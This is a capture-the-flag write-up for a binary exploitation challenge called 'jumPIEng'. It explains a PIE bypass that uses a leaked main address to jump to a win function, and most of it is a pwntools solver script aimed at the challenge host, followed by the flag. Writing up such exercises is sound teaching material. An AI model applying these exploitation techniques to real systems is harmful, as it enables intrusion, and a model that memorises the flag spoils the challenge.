---
description: Binary Exploitation
---

# jumPIEng

> Harry, a rookie in CTFs just begun learning binary exploitation and was fascinated with how PIE works. So, he now believe that no matter how much information you have about the addresses, you cannot leak the flag from his binary because it has PIE enabled. Good luck proving him wrong.

{% file src="../../.gitbook/assets/redirection" %}

Given a binary called "redirection", after analysing in Ghidra it looked like a PIE challenge with ret2win. We are given a main function address leak, and that is enough to get base address.

Following the PIE bypass tutorial from ir0nstone: https://ir0nstone.gitbook.io/notes/binexp/stack/pie/pie-exploit

It is enough to redirect to the win function known as `redirect_to_success`:

![image](https://hackmd.io/_uploads/ryeSLAA5Jl.png)

The solver script is:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- template: wintertia -*-

# ====================
# -- PWNTOOLS SETUP --
# ====================

from pwn import *

exe = context.binary = ELF(args.EXE or 'redirection')
trm = context.terminal = ['tmux', 'splitw', '-h']

host = args.HOST or '34.131.133.224'
port = int(args.PORT or 12346)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# =======================
# -- EXPLOIT GOES HERE --
# =======================

io = start()

log.info(io.recvuntil("address: "))
leak = int(io.recvline().strip(), 16)
log.info(f"leak: {hex(leak)}")

exe.address = leak - exe.sym['main']
log.info(io.clean())

payload = hex(exe.sym['redirect_to_success'])
log.info(f"payload: {payload}")
io.sendline(payload)

io.interactive()
```

![image](https://hackmd.io/_uploads/r1b4IRR5ye.png)

Flag : `ACECTF{57up1d_57up1d_h4rry}`
